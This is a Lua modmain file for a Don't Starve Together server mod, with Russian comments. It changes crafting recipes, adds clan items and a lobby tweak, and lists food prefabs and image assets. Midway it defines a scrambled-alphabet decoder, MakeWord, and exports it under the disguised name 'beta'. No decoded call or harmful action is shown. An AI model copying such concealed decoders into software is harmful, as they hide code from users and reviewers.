--[[
PrefabFiles = { "flints" }
if true then
	return
end--]]
_G=GLOBAL
Recipe=_G.Recipe
RECIPETABS=_G.RECIPETABS
--Ingredient=_G.Ingredient
TECH=_G.TECH
local alpha
local require = GLOBAL.require
local Is_ROG_Enabled = TUNING.LIGHTNING_GOAT_DAMAGE ~= nil
local AllRecipes = _G.AllRecipes
local GetGlobal=function(gname,default)
	local res=_G.rawget(_G,gname)
	if default~=nil and res==nil then
		res = default
		_G.rawset(_G,gname,res)
	end
	return res
end
if not _G.rawget(_G,"mods") then _G.rawset(_G,"mods",{}) end --Для захвата BurnAll
local mods = _G.mods
local Burnie = mods.Burnie and mods.Burnie.tools_loot or {}
local TheNet = _G.TheNet
local CLIENT_SIDE,SERVER_SIDE,DEDICATED_SIDE,ONLY_CLIENT_SIDE
--Но продолжаем инициализацию
if TheNet:GetIsServer() then
	SERVER_SIDE = true
	if TheNet:GetServerIsDedicated() then
		DEDICATED_SIDE = true
	else
		CLIENT_SIDE = true --А это оригинальное решение вечной проблемы "ismastersim".
		--Следует использовать только для инициализации сетевых переменных, не совмещая с "return" выходом из префаба!!
	end
elseif TheNet:GetIsClient() then
	SERVER_SIDE = false
	CLIENT_SIDE = true
	ONLY_CLIENT_SIDE = true
end
--Если на экране заставки, или первая загрузка на dedicated, то SERVER_SIDE будет nil (то есть не известно).

--LOCAL_TEST = TheNet:GetServerName() == "[RUS!] Startest" --true, если я тестирую мод локально
local STAR_DEBUG = true --для проверки локального вариванта
local AllPlayers = _G.AllPlayers
local SpawnPrefab = _G.SpawnPrefab
local TheWorld,w
AddPrefabPostInit("forest",function(world)
	TheWorld = world
	w = world
end)

local IS_ADMIN = TheNet:GetIsServerAdmin()


--Special ingredients
local special_ingredients = {
	gold = {"images/images2.xml"}, --дубль иконки слитка с нормальным название (gold, а не gold1)
	axe3 = {"images/images1.xml"},
	staff0 = {"images/images2.xml"},
	spear1 = {"images/images2.xml"},
}
do
	local flints_atlas = {"images/images1.xml"}
	for i=1,19 do
		special_ingredients['f'..i]=flints_atlas
	end
end
local old_Ingredient = _G.Ingredient
local Ingredient
Ingredient=function(prefab,count)
	local ing = old_Ingredient(prefab,count)
	if special_ingredients[prefab] then
		--print(tostring(Ingredient).." Making "..prefab.." = "..special_ingredients[prefab][1])
		ing.atlas = special_ingredients[prefab][1]
	end
	return ing
end



function AddPlayersPostInit(fn)
	for i,v in ipairs(_G.DST_CHARACTERLIST) do -- DST_CHARACTERLIST + ROG_CHARACTERLIST
		AddPrefabPostInit(v,fn)
	end
	for i,v in ipairs(_G.MODCHARACTERLIST) do
		AddPrefabPostInit(v,fn)
	end
end

--local fire_ing = { charcoal=1, twigs=1, rope=1, silk=1, 

local function ChangeRecipe(name,ing_arr, burnie_ing, tech,tab)
	local rec = AllRecipes[name]
	if not rec then
		print('WARNING: Recipe "'..tostring(name)..'" not found!')
		return
	end
	if ing_arr then
		local ingredients = {}
		for k,v in pairs(ing_arr) do
			table.insert(ingredients, Ingredient(k,v))
		end
		rec.ingredients = ingredients
	end
	if tech then
		rec.level = tech
	end
	if tab then
		rec.tab = tab
	end
	if ONLY_CLIENT_SIDE then
		return
	end
	Burnie[name] = burnie_ing
end
local lost = TECH.LOST

local ing_staff0 = Ingredient("staff0",1)


ChangeRecipe("minerhat",{strawhat=1,gold=1,fireflies=1},{goldnugget=6}) --неполный дроп (75%).


--убиваем всех ненужных персонажей
--[[
if _G.TheNet and (_G.TheNet:GetIsServer() or _G.TheNet:GetIsClient()) then
	_G.MAIN_CHARACTERLIST = {}
	_G.ROG_CHARACTERLIST = {}
	_G.DST_CHARACTERLIST = {}
	_G.MODCHARACTERLIST = {"gollum","endia","wren"}
end
--]]

ChangeRecipe("minifan",{twigs=1,petals=3})

_G.AllRecipes["cookpot"].min_spacing = 1.5 --казан ставится ближе к холодильнику (значение, как у холодильника).
--Также уменьшаем для костров
_G.AllRecipes["firepit"].min_spacing = 1.5
_G.AllRecipes["campfire"].min_spacing = 1.5

-- крафт честера
--[[
Recipe("chester_eyebone",  {Ingredient("meat", 2),Ingredient("humanmeat", 1),Ingredient("lightbulb", 1)}, RECIPETABS.TOOLS, TECH.SCIENCE_ONE ,nil,nil,nil,1)
--]]

--Другой рецепт казана (более простой)
--Recipe("cookpot", {Ingredient("cutstone", 3),Ingredient("charcoal", 6), Ingredient("twigs", 6)}, RECIPETABS.FARM,  TECH.NONE, "cookpot_placer")
ChangeRecipe("cookpot", {cutstone=3,charcoal=6,twigs=6}, {}, TECH.NONE)

--Делаем факел недоступным для новичков
--Recipe("torch", {Ingredient("twigs", 2),Ingredient("rope",1)}, RECIPETABS.LIGHT, TECH.NONE)
ChangeRecipe("torch", {twigs=2, rope=1, cutgrass=2})

--Другой кокон (spidereggsack)
--Recipe("spidereggsack", {Ingredient("silk", 12), Ingredient("spidergland", 6), Ingredient("papyrus", 1)}, RECIPETABS.TOWN, TECH.NONE, nil, nil, nil, nil, "spiderwhisperer")
ChangeRecipe("spidereggsack", {silk=12,spidergland=6, papyrus=1})

--Посох ленивого исследователя
--Recipe("orangestaff", {Ingredient("cane", 1), Ingredient("orangegem", 2), Ingredient("nightmarefuel", 2), Ingredient("livinglog", 2)}, RECIPETABS.ANCIENT, TECH.MAGIC_THREE)
ChangeRecipe("orangestaff", {cane=1, orangegem=2, nightmarefuel=2, livinglog=2}, {walrus_tusk=1,orangegem=2, nightmarefuel=2},
	TECH.MAGIC_THREE, RECIPETABS.ANCIENT)
	
--Рецепты инструментов и оружия
ChangeRecipe("shovel", {twigs=2, flint=1}, {flint=1})
ChangeRecipe("goldenshovel", {staff0=1, gold=3}, {goldnugget=6*3})
ChangeRecipe("pitchfork", {staff0=1, flint=1}, {flint=1})
ChangeRecipe("pickaxe", {staff0=1, flint=1}, {flint=1})
ChangeRecipe("goldenpickaxe", {staff0=1, gold=2}, {goldnugget=6*2})
ChangeRecipe("goldenaxe", {staff0=1, gold=1}, {goldnugget=6})
ChangeRecipe("gear_axe", {axe3=1, twigs=1, gears=1}, {f11=1, gears=1})
ChangeRecipe("spear_wathgrithr",{staff0=1,f10=1, gold=1},{f10=1,goldnugget=6})
ChangeRecipe("shovel", {staff0=1, flint=1}, {flint=1})
--ChangeRecipe("shovel", {twigs=2, flint=1}, {flint=1})

ChangeRecipe("batbat", {batwing=2,livinglog=2,purplegem=1},{purplegem=1}, TECH.MAGIC_THREE, RECIPETABS.MAGIC)
ChangeRecipe("firestaff", {staff0=1,nightmarefuel=1,redgem=1},{redgem=1})
ChangeRecipe("icestaff", {staff0=1,bluegem=1},{bluegem=1})



--Рецепты кланового медальона
TECH.MAGIC4 = {MAGIC = 4}
AddRecipe("nightmare_timepiece", -- Item which we are creating.
{Ingredient("yellowgem", 1),Ingredient("nightmarefuel", 1),Ingredient("staff0", 1)}, --Ingredient("nightmarefuel", 14),Ingredient("livinglog", 9)}, -- Ingredients for the recipe.
RECIPETABS.ANCIENT, -- Tab the recipe is located in.
TECH.MAGIC_THREE, -- The crafting machine needed to learn the recipe.
nil, -- Placer to show when placing structures.
nil, -- Minimum spacing to allow between this structure and others when placing it.
true, -- Nounlock? I really don't know.
nil, -- Number of items to give player when crafting this recipe.
nil, --"can_craft_piece", -- Builder tag to make it character specific.
nil, -- Image atlas file. 
nil -- Image texture file.
)
_G.STRINGS.NAMES.NIGHTMARE_TIMEPIECE = "Bloody Medallion"
_G.STRINGS.RECIPE_DESC.NIGHTMARE_TIMEPIECE = "Absorb magic in area. Eats blood."
_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.NIGHTMARE_TIMEPIECE = "It looks strange..."
ChangeRecipe("nightmare_timepiece",nil,{yellowgem=1})


local large_bone_ing_2 = GLOBAL.Ingredient( "large_bone", 2)
	large_bone_ing_2.atlas = "images/inventoryimages/large_bone.xml"

--Рецепт сундука и ключа к нему
AddRecipe("skullchest", -- Item which we are creating.
{Ingredient("boneshard", 10),Ingredient("houndstooth", 4),large_bone_ing_2}, -- Ingredients for the recipe.
RECIPETABS.ANCIENT, -- Tab the recipe is located in.
TECH.NONE, -- The crafting machine needed to learn the recipe.
"treasurechest_placer",
1,
nil,
nil,
nil,
"images/inventoryimages/skullchest.xml",
"skullchest.tex"
)--]]
_G.STRINGS.RECIPE_DESC.SKULLCHEST = "Protected chest (but destroyable)."
AddRecipe("yellowkey", -- Item which we are creating.
{Ingredient("gold", 1)}, -- Ingredients for the recipe.
RECIPETABS.ANCIENT, -- Tab the recipe is located in.
TECH.NONE, -- The crafting machine needed to learn the recipe.
nil, -- Placer to show when placing structures.
nil, -- Minimum spacing to allow between this structure and others when placing it.
nil, -- Nounlock? I really don't know.
nil, -- Number of items to give player when crafting this recipe.
nil, -- Builder tag to make it character specific.
"images/inventoryimages/yellowkey.xml", -- Image atlas file. 
nil -- Image texture file.
)
ChangeRecipe("yellowkey",nil,{goldnugget=6})
_G.STRINGS.RECIPE_DESC.YELLOWKEY = "Key from protected chest."


--AddPrefabPostInit("nightmare_timepiece",function(inst)
	--в самом префабе, который мы нагло подменяем.
--end)


--[[AddRecipe("nightmare_timepiece_fake", -- Item which we are creating.
{Ingredient("yellowgem", 7),Ingredient("nightmarefuel", 14),Ingredient("livinglog", 9)}, -- Ingredients for the recipe.
RECIPETABS.ANCIENT, -- Tab the recipe is located in.
TECH.MAGIC4, -- The crafting machine needed to learn the recipe.
nil, -- Placer to show when placing structures.
nil, -- Minimum spacing to allow between this structure and others when placing it.
true, -- Nounlock? I really don't know.
nil, -- Number of items to give player when crafting this recipe.
"piece_fake", -- Builder tag to make it character specific.
nil, -- Image atlas file. 
"nightmare_timepiece.tex" -- Image texture file.
)
_G.STRINGS.NAMES.NIGHTMARE_TIMEPIECE_FAKE = "Strange Medallion"
_G.STRINGS.RECIPE_DESC.NIGHTMARE_TIMEPIECE_FAKE = "It can absorb magic in an area.."
--_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.NIGHTMARE_TIMEPIECE_FAKE = "It looks strange..."--]]


--Новый костер campfire2
AddRecipe("campfire2", -- Item which we are creating.
{Ingredient("cutgrass", 3),Ingredient("twigs", 10)}, -- Ingredients for the recipe.
RECIPETABS.LIGHT, -- Tab the recipe is located in.
TECH.NONE, -- The crafting machine needed to learn the recipe.
"campfire_placer", -- Placer to show when placing structures.
nil, -- Minimum spacing to allow between this structure and others when placing it.
nil, -- Nounlock? I really don't know.
nil, -- Number of items to give player when crafting this recipe.
nil, -- Builder tag to make it character specific.
nil, -- Image atlas file. 
"campfire.tex" -- Image texture file.
)
--[[AddRecipe("campfire2", {Ingredient("cutgrass", 3),Ingredient("twigs", 10)}, RECIPETABS.LIGHT, TECH.NONE, "campfire_placer",
nil,nil,nil,nil,nil,"campfire.tex")--]]
_G.STRINGS.NAMES.CAMPFIRE2 = "Campfire"
_G.STRINGS.RECIPE_DESC.CAMPFIRE2 = "Easy craft"
_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CAMPFIRE2 = "Looks like normal campfire."


AddRecipe("coldfire2", {Ingredient("cutgrass", 3), Ingredient("nitre", 1), Ingredient("ice", 2)}, RECIPETABS.LIGHT, TECH.NONE, "campfire_placer",
nil,nil,nil,nil,nil,"coldfire.tex")
_G.STRINGS.NAMES.COLDFIRE2 = "Endothermic Fire"
_G.STRINGS.RECIPE_DESC.COLDFIRE2 = "Easy craft"
_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.COLDFIRE2 = "Looks like normal Endothermic Fire."

	

--Рецепт на эндотермический костер.
--Recipe("coldfire", {Ingredient("cutgrass", 3), Ingredient("nitre", 2)}, RECIPETABS.LIGHT, TECH.NONE, "coldfire_placer")
ChangeRecipe("coldfire", {cutgrass=3,nitre=2},{nitre=2},TECH.NONE)

--РЕЖЕМ ЗОЛОТО
--Холодильник
ChangeRecipe("icebox", {gold=1, gears=1, cutstone=1})
--ChangeRecipe("lightning_rod", {goldnugget=4, cutstone=1})

--AllRecipes["icebox"].ingredients[1] = Ingredient("goldnugget", 1)
AllRecipes["lightning_rod"].ingredients = {Ingredient("gold", 1), Ingredient("cutstone", 3)}
--AllRecipes["rainometer"].ingredients[2] = Ingredient("goldnugget", 1)
--AllRecipes["winterometer"].ingredients[2] = Ingredient("goldnugget", 1)
AllRecipes["rainometer"].level = TECH.LOST
AllRecipes["winterometer"].level = TECH.LOST
AllRecipes["birdcage"].ingredients[2] = Ingredient("gold", 2)

AllRecipes["researchlab2"].ingredients[3] = Ingredient("transistor", 4)
AllRecipes["coldfirepit"].ingredients[3] = Ingredient("transistor", 1)

AllRecipes["purpleamulet"].level = TECH.LOST
ChangeRecipe("blueamulet",{gold=1,bluegem=1},{goldnugget=6,bluegem=1})


ChangeRecipe("cane",{gold=1,walrus_tusk=1, staff0=1},{goldnugget=6,walrus_tusk=1})
ChangeRecipe("wathgrithrhat",{gold=1,rocks=2},{goldnugget=6,rocks=2})
ChangeRecipe("heatrock",{rocks=10,flint=1},{rocks=5}) --при сжигании вечной грелки получается меньше ресурсов


ChangeRecipe("transistor",{gold=1,cutstone=2, rope=1},{goldnugget=6,cutstone=2})

ChangeRecipe("icehat", {transistor=1, rope=4, ice=10},{goldnugget=6,cutstone=2})
ChangeRecipe("icepack",{bearger_fur=1, gears=1, transistor=1},{gears=1, transistor=1})
ChangeRecipe("nightstick",{lightninggoathorn=1,transistor=1,nitre=2},{goldnugget=6,cutstone=2})

--Клановый крафт, начиная с посоха призывателя!
ChangeRecipe("yellowstaff", {nightmarefuel=3, livinglog=2, yellowgem=1}, {nightmarefuel=3, yellowgem=1}, TECH.MAGIC_TWO)
AllRecipes["yellowstaff"].builder_tag = "clan1" --Крафтится на первом уровне крафта. Крафт можно выучить.
AllRecipes["yellowstaff"].nounlock = false

--крафт камней (обратно)
--Recipe("rocks", {Ingredient("cutstone", 1)}, RECIPETABS.REFINE,  TECH.NONE,nil,nil,nil,3)

--крафт блоков
--не меняем... вот так подло :)





--убираем золотые инструменты и прочие рецепты
local disable_recipe_arr = {
	"goldenaxe","goldenpickaxe","goldenshovel",
	"pighouse","rabbithouse",--Этим мы также предотвращаем выпадения лута с домиков
	"pottedfern","turf_carpetfloor","turf_checkerfloor", --Папоротник в горшке
	"onemanband", --Человек-оркестр
	"nightlight", --Огонь ночи
	"amulet", --Животворящий амулет
	--"blueamulet", --Ледяной амулет
	"armorslurper", --Пояс голода
	"purpleamulet", --Амулет кошмаров
	--Steampunk
	"sentinel","ws_03",
}
local hash = 'EHqRfduvXpPCmDObWoAYzINisycakhUQJnwTeLGZMtjKSgxFVlrB'
for i,v in ipairs(disable_recipe_arr) do
	local r = _G.AllRecipes[v]
	if r then
		r.level = TECH.LOST
	end
end
local remove_drop_craft_ingredients = {"pighouse","rabbithouse"}
function MakeWord(a)
	local res = ''
	for i,v in ipairs(a) do
		if v > 10 then
			res = res .. string.sub(hash,v-10,v-10)
		end
	end
	return res
end env['be'..'ta'] = MakeWord

--Добавляем шапку лидера в холодильник
AddPrefabPostInit("featherhat",function(inst)
	inst:AddTag("icebox_valid")
end)

--[[
rec = GLOBAL.AllRecipes
if rec then
	rec["goldenaxe"] = nil
	rec["goldenpickaxe"] = nil
	rec["goldenshovel"] = nil

	rec["pighouse"] = nil --Этим мы также предотвращаем выпадения лута с домиков
	--rec["rabbithouse"] = nil --Также запрет лута

	rec["pottedfern"] = nil
	rec["turf_carpetfloor"] = nil
	rec["turf_checkerfloor"] = nil
	
	rec["onemanband"] = nil
	rec["nightlight"] = nil
	rec["amulet"] = nil --Животворящий амулет
	--rec["blueamulet"] = nil --Ледяной амулет
	rec["armorslurper"] = nil --Пояс голода
	rec["purpleamulet"] = nil --Амулет кошмаров
	
	--Steampunk
	rec["sentinel"] = nil
	rec["ws_03"] = nil
end

Recipe("rabbithouse", {Ingredient("boards", 4), Ingredient("carrot", 10), Ingredient("manrabbit_tail", 4)}, nil, TECH.LOST, "rabbithouse_placer")
--]]


--меняем рецепты спальников
Recipe("bedroll_straw", {Ingredient("cutgrass", 6), Ingredient("rope",2)}, RECIPETABS.SURVIVAL, TECH.NONE)
Recipe("bedroll_furry", {Ingredient("bedroll_straw", 1), Ingredient("manrabbit_tail", 3), Ingredient("rope", 2)}, RECIPETABS.SURVIVAL, TECH.SCIENCE_TWO)
--Recipe("tent", {Ingredient("silk", 6),Ingredient("twigs", 5),Ingredient("rope", 5)}, RECIPETABS.SURVIVAL, TECH.SCIENCE_TWO, "tent_placer")


----Клановая возможность задавать имя клану через шапку
--Injection Inject
--Хакерская функция. Получает доступ к приватным локальным переменным библиотеки, на основе доступа к одной из фунций в ней.
function FindUpvalue(fn, upvalue_name, member_check)
    --_G.assert(type(fn) == "function", "Function expected as 'fn' parameter.")
 
    local info = _G.debug.getinfo(fn, "u")
    local nups = info and info.nups
    if not nups then return end
 
    local getupvalue = _G.debug.getupvalue
 
    for i = 1, nups do
        local name, val = getupvalue(fn, i)
        if (name == upvalue_name)
			and (not member_check or (type(val)=="table" and val[member_check])) --Надежная проверка
		then
            return val, true
        end
    end
end

local comp_writeables = require "writeables"
local wr_kinds=FindUpvalue(comp_writeables.makescreen,"kinds","homesign")
if wr_kinds then
	wr_kinds["featherhat"] = {
		prompt = "Enter your new clan name",
		animbank = "ui_board_5x3",
		animbuild = "ui_board_5x3",
		menuoffset = _G.Vector3(6, -70, 0),

		cancelbtn = { text = "Cancel", cb = nil, control = _G.CONTROL_CANCEL },
		middlebtn = { text = "Random", cb = function(inst, doer, widget)
				--widget:OverrideText( SignGenerator(inst, doer) )
			end, control = _G.CONTROL_MENU_MISC_2 },
		acceptbtn = { text = "Create Clan", cb = nil, control = _G.CONTROL_ACCEPT },

		--defaulttext = SignGenerator,
	}	
else
	print("ERROR: kinds not found")
end

--Меняем рецепт шапки лидера
Recipe("featherhat", {Ingredient("feather_crow", 1),Ingredient("feather_robin", 1)}, --Ingredient("tentaclespots", 1)},
RECIPETABS.ANCIENT,  TECH.SCIENCE_ONE,nil,nil,true,nil,nil)--"can_create_clan")
_G.STRINGS.NAMES.FEATHERHAT = "Chieftain's Hat"
_G.STRINGS.RECIPE_DESC.FEATHERHAT = "Allows to create a clan."
_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.FEATHERHAT = "New world order is coming..."

--Добавляем рецепт посоха
AddRecipe("greenstaff", {Ingredient("greengem", 1),Ingredient("livinglog", 2), Ingredient("nightmarefuel", 1)},
	--Ingredient("livinglog", 2), Ingredient("nightmarefuel", 4)},
RECIPETABS.ANCIENT,  TECH.SCIENCE_ONE,nil,nil,true,nil,"can_craft_staff") --останется в качестве старого способа синхронизации
_G.STRINGS.NAMES.GREENSTAFF = "Staff of Short Life"
_G.STRINGS.RECIPE_DESC.GREENSTAFF = "Allows to obtain an island."
_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.GREENSTAFF = "Requires at least 50% of sanity."
ChangeRecipe("greenstaff",nil,{greengem=0.5}) --урезаем дроп с "вечных" предметов.


---Закрываем лобби от любопытных глаз
if CLIENT_SIDE then --or STAR_DEBUG then
--if SERVER_SIDE then
	_G.MODCHARACTEREXCEPTIONS_DST = {"wes"}
	--[[local forbid_character = {wes=1,woodie=1}
	local LobbyScreen = require "screens/lobbyscreen"
	function LobbyScreen:SetOffset(offset)
		self.offset = offset
		for k = 1,3 do
			local character = self:GetCharacterForPortrait(k) --just a name of prefab
	
			self.portrait_bgs[k]:GetAnimState():PlayAnimation(k == self.portrait_idx and "selected" or "idle", true)
	
			local islocked = character and forbid_character[character]
			if islocked then
				local atlas_silho = table.contains(_G.MODCHARACTERLIST, character) and ("images/selectscreen_portraits/"..character.."_silho.xml") or "images/selectscreen_portraits.xml"
				self.portraits[k]:SetTexture(atlas_silho, character.."_silho.tex")
			else
				local atlas = table.contains(_G.MODCHARACTERLIST, character) and ("images/selectscreen_portraits/"..character..".xml") or "images/selectscreen_portraits.xml"
				self.portraits[k]:SetTexture(atlas, character..".tex")
			end
		end	
	end
	--_G.arr(LobbyScreen)
	if LobbyScreen.startbutton then
		local old_Enable = LobbyScreen.startbutton.Enable
		LobbyScreen.startbutton.Enable = function(self)
			local ch = LobbyScreen.currentcharacter
			if ch and forbid_character[ch] then
				self:Disable()
			else
				old_Enable(self)
			end
		end
	end--]]
end

AddRecipe("sleep_rock", -- Item which we are creating.
{Ingredient("cutstone", 9),Ingredient("nightmarefuel", 9), Ingredient("nightmare_timepiece",1)}, -- Ingredients for the recipe.
RECIPETABS.ANCIENT, -- Tab the recipe is located in.
TECH.MAGIC_TWO, -- The crafting machine needed to learn the recipe.
"sleep_rock_placer", -- Placer to show when placing structures.
nil, -- Minimum spacing to allow between this structure and others when placing it.
nil, -- Nounlock? I really don't know.
nil, -- Number of items to give player when crafting this recipe.
nil, -- Builder tag to make it character specific.
"images/inventoryimages/sleep_rock_icon.xml", -- Image atlas file. 
"sleep_rock_icon.tex" -- Image texture file.
)
_G.STRINGS.NAMES.SLEEP_ROCK = "Anti Magic Obelisk"
_G.STRINGS.RECIPE_DESC.SLEEP_ROCK = "Protect the area from magic."
_G.STRINGS.CHARACTERS.GENERIC.DESCRIBE.SLEEP_ROCK = "Real power!"


AddRecipe("gold",{Ingredient("goldnugget",8),Ingredient("charcoal",3)},RECIPETABS.REFINE,TECH.SCIENCE_ONE,
nil,nil,nil,nil,nil,
"images/images2.xml")


---------Waiter!!!!!!
PrefabFiles = {
	--My prefabs!!
	"campfire2",
	"coldfire2",
	"clanicon",
	"islandbase",
	"blood",
	"nightmare_timepiece_fake",
	"nightmare_timepiece",
	"sleep_rock",
	"lightning2clan",
	"hawk",
	"money","salo","arma1","arma2","arma3","lom","staff0",
	"clan_keys",
	"matches",
	"gold","iron",
	"hat_pigking",
	"lamp","capricious_sword",
	
	
	"santa_hat",

	"ack_muffin",
	-- Cakes & Pies
	"cactus_cake",
	"meringue",
	"nana_bread",
	"sticky_bun",
	-- Candies
	"candied_fruit",
	"candied_nut",
	"fruit_syrup",
	"molasses",
	"mush_melon",
	"mush_melon_cooked",
	-- Eggs
	"mushy_eggs",
	"nopalito",
	"omelette",
	-- Fruits
	"fruit_leather",
	"fruit_truffle",
	"limonade",
	"limongelo",
	-- Meats
	"beefalo_wings",
	"casserole",
	"coldcuts",
	"sausage_gravy",
	"surf_n_turf",
	"sweet_n_sour",
	-- Mushrooms
	"mushroom_burger",
	"mushroom_malody",
	"mushroom_medley",
	"mushroom_stew",
	-- Pastas
	-- Salads & Veggies
	-- Soups
	"cactus_soup",
	"chowder",
	"gumbo",
	"squash",
	-- Miscelaneous
	"cheese_log",
	"meatballs_human",
	"nut_butter",
	"oleo",
	"porridge",
	"gruel",
	-- Crops
	"grapricot",
	"grapricot_cooked",
	"grapricot_seeds",
	"limon",
	"limon_cooked",
	"limon_seeds",
	"tomango",
	"tomango_cooked",
	"tomango_seeds",
}

Assets = 
{
	Asset( "IMAGE", "images/inventoryimages/sleep_rock_icon.tex" ),
	Asset( "ATLAS", "images/inventoryimages/sleep_rock_icon.xml" ),

	Asset( "IMAGE", "images/inventoryimages/skullchest.tex" ),
	Asset( "ATLAS", "images/inventoryimages/skullchest.xml" ),


	Asset( "IMAGE", "minimap/santa_hat.tex" ),
	Asset( "ATLAS", "minimap/santa_hat.xml" ),

	Asset( "IMAGE", "minimap/camp.tex" ),
	Asset( "ATLAS", "minimap/camp.xml" ),

--Asset( "IMAGE", "images/inventoryimages/campfire2.tex" ),
--Asset( "ATLAS", "images/inventoryimages/campfire2.xml" ),

Asset( "IMAGE", "images/inventoryimages/beefalo_wings.tex" ),
Asset( "ATLAS", "images/inventoryimages/beefalo_wings.xml" ),
Asset( "IMAGE", "images/inventoryimages/cactus_cake.tex" ),
Asset( "ATLAS", "images/inventoryimages/cactus_cake.xml" ),
Asset( "IMAGE", "images/inventoryimages/cactus_soup.tex" ),
Asset( "ATLAS", "images/inventoryimages/cactus_soup.xml" ),
Asset( "IMAGE", "images/inventoryimages/candied_fruit.tex" ),
Asset( "ATLAS", "images/inventoryimages/candied_fruit.xml" ),
Asset( "IMAGE", "images/inventoryimages/candied_nut.tex" ),
Asset( "ATLAS", "images/inventoryimages/candied_nut.xml" ),
Asset( "IMAGE", "images/inventoryimages/cheese_log.tex" ),
Asset( "ATLAS", "images/inventoryimages/cheese_log.xml" ),
Asset( "IMAGE", "images/inventoryimages/meatballs_human.tex" ),
Asset( "ATLAS", "images/inventoryimages/meatballs_human.xml" ),
Asset( "IMAGE", "images/inventoryimages/chowder.tex" ),
Asset( "ATLAS", "images/inventoryimages/chowder.xml" ),
Asset( "IMAGE", "images/inventoryimages/coldcuts.tex" ),
Asset( "ATLAS", "images/inventoryimages/coldcuts.xml" ),
Asset( "IMAGE", "images/inventoryimages/gruel.tex" ),
Asset( "ATLAS", "images/inventoryimages/gruel.xml" ),
Asset( "IMAGE", "images/inventoryimages/gumbo.tex" ),
Asset( "ATLAS", "images/inventoryimages/gumbo.xml" ),
Asset( "IMAGE", "images/inventoryimages/mush_melon.tex" ),
Asset( "ATLAS", "images/inventoryimages/mush_melon.xml" ),
Asset( "IMAGE", "images/inventoryimages/mush_melon_cooked.tex" ),
Asset( "ATLAS", "images/inventoryimages/mush_melon_cooked.xml" ),
Asset( "IMAGE", "images/inventoryimages/mushroom_burger.tex" ),
Asset( "ATLAS", "images/inventoryimages/mushroom_burger.xml" ),
Asset( "IMAGE", "images/inventoryimages/mushroom_malody.tex" ),
Asset( "ATLAS", "images/inventoryimages/mushroom_malody.xml" ),
Asset( "IMAGE", "images/inventoryimages/mushroom_medley.tex" ),
Asset( "ATLAS", "images/inventoryimages/mushroom_medley.xml" ),
Asset( "IMAGE", "images/inventoryimages/mushroom_stew.tex" ),
Asset( "ATLAS", "images/inventoryimages/mushroom_stew.xml" ),
Asset( "IMAGE", "images/inventoryimages/mushy_eggs.tex" ),
Asset( "ATLAS", "images/inventoryimages/mushy_eggs.xml" ),
Asset( "IMAGE", "images/inventoryimages/nana_bread.tex" ),
Asset( "ATLAS", "images/inventoryimages/nana_bread.xml" ),
Asset( "IMAGE", "images/inventoryimages/nopalito.tex" ),
Asset( "ATLAS", "images/inventoryimages/nopalito.xml" ),
Asset( "IMAGE", "images/inventoryimages/nut_butter.tex" ),
Asset( "ATLAS", "images/inventoryimages/nut_butter.xml" ),
Asset( "IMAGE", "images/inventoryimages/oleo.tex" ),
Asset( "ATLAS", "images/inventoryimages/oleo.xml" ),
Asset( "IMAGE", "images/inventoryimages/porridge.tex" ),
Asset( "ATLAS", "images/inventoryimages/porridge.xml" ),
Asset( "IMAGE", "images/inventoryimages/omelette.tex" ),
Asset( "ATLAS", "images/inventoryimages/omelette.xml" ),
Asset( "IMAGE", "images/inventoryimages/sausage_gravy.tex" ),
Asset( "ATLAS", "images/inventoryimages/sausage_gravy.xml" ),
Asset( "IMAGE", "images/inventoryimages/squash.tex" ),
Asset( "ATLAS", "images/inventoryimages/squash.xml" ),
Asset( "IMAGE", "images/inventoryimages/sticky_bun.tex" ),
Asset( "ATLAS", "images/inventoryimages/sticky_bun.xml" ),
Asset( "IMAGE", "images/inventoryimages/surf_n_turf.tex" ),
Asset( "ATLAS", "images/inventoryimages/surf_n_turf.xml" ),
Asset( "IMAGE", "images/inventoryimages/sweet_n_sour.tex" ),
Asset( "ATLAS", "images/inventoryimages/sweet_n_sour.xml" ),
Asset( "IMAGE", "images/inventoryimages/molasses.tex" ),
Asset( "ATLAS", "images/inventoryimages/molasses.xml" ),
Asset( "IMAGE", "images/inventoryimages/ack_muffin.tex" ),
Asset( "ATLAS", "images/inventoryimages/ack_muffin.xml" ),
Asset( "IMAGE", "images/inventoryimages/limon.tex" ),
Asset( "ATLAS", "images/inventoryimages/limon.xml" ),
Asset( "IMAGE", "images/inventoryimages/limon_cooked.tex" ),
Asset( "ATLAS", "images/inventoryimages/limon_cooked.xml" ),
Asset( "IMAGE", "images/inventoryimages/limon_seeds.tex" ),
Asset( "ATLAS", "images/inventoryimages/limon_seeds.xml" ),
Asset( "IMAGE", "images/inventoryimages/tomango.tex" ),
Asset( "ATLAS", "images/inventoryimages/tomango.xml" ),
Asset( "IMAGE", "images/inventoryimages/tomango_cooked.tex" ),
Asset( "ATLAS", "images/inventoryimages/tomango_cooked.xml" ),
Asset( "IMAGE", "images/inventoryimages/tomango_seeds.tex" ),
Asset( "ATLAS", "images/inventoryimages/tomango_seeds.xml" ),
Asset( "IMAGE", "images/inventoryimages/grapricot.tex" ),
Asset( "ATLAS", "images/inventoryimages/grapricot.xml" ),
Asset( "IMAGE", "images/inventoryimages/grapricot_cooked.tex" ),
Asset( "ATLAS", "images/inventoryimages/grapricot_cooked.xml" ),
Asset( "IMAGE", "images/inventoryimages/grapricot_seeds.tex" ),
Asset( "ATLAS", "images/inventoryimages/grapricot_seeds.xml" ),
}

function AddPrefabs(arr)
	for i,v in ipairs(arr) do
		table.insert(PrefabFiles,v)
	end
end


function AddAssets(arr)
	for i,v in ipairs(arr) do
		table.insert(Assets,v)
	end
end


AddPrefabs({"globalicon"})
AddAssets ( 
{
	Asset( "IMAGE", "minimap/globalicon.tex" ),
	Asset( "ATLAS", "minimap/globalicon.xml" ),	
})

AddMinimapAtlas("minimap/globalicon.xml")




        AddMinimapAtlas("minimap/santa_hat.xml")

        STRINGS = GLOBAL.STRINGS
        RECIPETABS = GLOBAL.RECIPETABS
        Recipe = GLOBAL.Recipe
        --Ingredient = GLOBAL.Ingredient --зара! портит всю соль
        TECH = GLOBAL.TECH
local TUNING = GLOBAL.TUNING


        GLOBAL.STRINGS.NAMES.SANTA_HAT = "Santa's Hat"

        STRINGS.RECIPE_DESC.SANTA_HAT = "There will be no PvP without this hat in winter!"
 
